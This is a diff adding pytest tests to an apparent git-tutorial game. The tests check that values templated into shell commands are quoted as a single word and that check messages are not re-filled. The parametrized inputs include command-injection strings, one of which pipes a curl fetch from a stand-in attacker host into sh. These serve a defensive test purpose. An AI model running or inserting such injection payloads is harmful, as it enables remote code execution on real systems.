@@ -309,6 +309,31 @@ def test_text_of_the_level_in_progress_is_filled_from_its_state(sample_level: ru
     assert [step["question"] for step in view["steps"][:2]] == [[], []]
 
 
+@pytest.mark.parametrize(
+    ("value", "typed"),
+    [("trunk", "git switch trunk"), ("x;curl${IFS}evil.example|sh", "git switch 'x;curl${IFS}evil.example|sh'"), ("$(touch pwned)", "git switch '$(touch pwned)'")],
+)
+def test_a_value_filled_into_a_step_command_is_one_shell_word(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch, value: str, typed: str) -> None:
+    level = dataclasses.replace(sample_level, setup=lambda lab: {"branch": value}, quest=(kit.ReadStep(id="go", text="Switch to `{{branch}}`.", command="git switch {{branch}}"),))
+    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
+    game.start(level.id)
+    (step,) = game.level(level.id)["steps"]
+    assert (step["command"], step["text"]) == (typed, markup.parse(f"Switch to `{value}`."))
+
+
+def test_a_check_message_is_shown_as_written_never_filled_again(sample_level: runner.Level, monkeypatch: pytest.MonkeyPatch) -> None:
+    def tells_untracked(lab: kit.Lab, state: kit.State, answer: str | None) -> kit.Verdict:
+        return kit.Verdict(False, "These files are untracked: `{{expected}}`.")
+
+    secret_step = kit.AnswerStep(id="secret", text="Which?", question="Which?", check=tells_untracked)
+    level = dataclasses.replace(sample_level, setup=lambda lab: {"expected": "4f2a9c1d"}, check=tells_untracked, quest=(secret_step,))
+    monkeypatch.setattr(runner, "catalogue", lambda: {level.id: level})
+    game.start(level.id)
+    shown = markup.parse("These files are untracked: `{{expected}}`.")
+    assert game.quest_step("x")["message"] == shown
+    assert game.check("x", auto=False)["message"] == shown
+
+
 def test_a_level_page_lists_the_hints_already_revealed(sample_level: runner.Level) -> None:
     game.start(sample_level.id)
     game.hint()
